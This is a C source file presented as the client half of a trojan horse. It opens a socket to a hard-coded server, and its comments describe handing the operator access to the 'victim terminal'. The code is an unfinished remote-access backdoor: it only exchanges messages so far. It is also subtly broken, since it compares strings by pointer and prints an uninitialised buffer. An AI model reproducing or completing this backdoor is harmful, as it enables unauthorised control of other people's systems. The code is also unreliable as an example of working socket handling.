/* This is the file that contains the trojan horse for the 
 * trj horse.
 *
 * It uses a socket to connect to the server and give access 
 * to the system.
 *
 * For more information:
 *
 *    https://github.com/pblcc/trj
 * */
#include <stdio.h>	
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>

int start()
{
  int sock;
  struct sockaddr_in server;
  char message[1000], server_reply[2048];
  char terminal_command[40] = "terminal-on";
  bool terminal = false;

  /* To actually start the client, we have to create
   * a socket using socket() and then connect it to the 
   * server.
   * */
  sock = socket(AF_INET , SOCK_STREAM , 0);
  if (sock == -1)
  {
  	printf("[E]: Can't create a socket\n");
  }
  printf("Socket created successfully\n");
  server.sin_addr.s_addr = inet_addr("127.0.1.1");
  server.sin_family = AF_INET;
  server.sin_port = htons(3330);
  if (connect(sock, (struct sockaddr*) &server, sizeof(server)) < 0)
  {
    printf("[E]: Can't connect to the server...\n");
    return 1;
  }
  printf("Socket connected to the server...\n"); 
  while(1)
  {
    printf("1 %s:\n", server_reply);
    server_reply[0] = '\0';
    printf("2 %s:\n", server_reply);
    strcpy(message, "Message recived at client...\n");
    if (recv(sock, server_reply, 2000, 0) < 0)
    {
      printf("[E]: Fatal, can't recive the msg from the server\n");
      break;
    }
    printf("3 %s:\n", server_reply);
    printf("[S]: %s\n", server_reply);
    /* If the user wants to enter the victim terminal it has
     * to type the command 'terminal-on'. Then the program will
     * check if it already has access to the terminal, if the server
     * doesn't it will change the terminal boolean flag. 
     * */
    if (server_reply == terminal_command) 
    {
      if (terminal)
      {
        // If the terminal mode was already on, inform the user
        strcpy(message, "Terminal mode was already turned on...");
      } else
      {
        terminal = true;
        strcpy(message, "Now you have access to the system terminal...");
      }
      continue;
    }
    // Send a confirmation from the client to the server 
    if (send(sock , message , strlen(message) , 0) < 0)
    {
      printf("[E]: Can't send a message to the server");
      return 1;
    }
  } 
  close(sock);
  return 0;
}

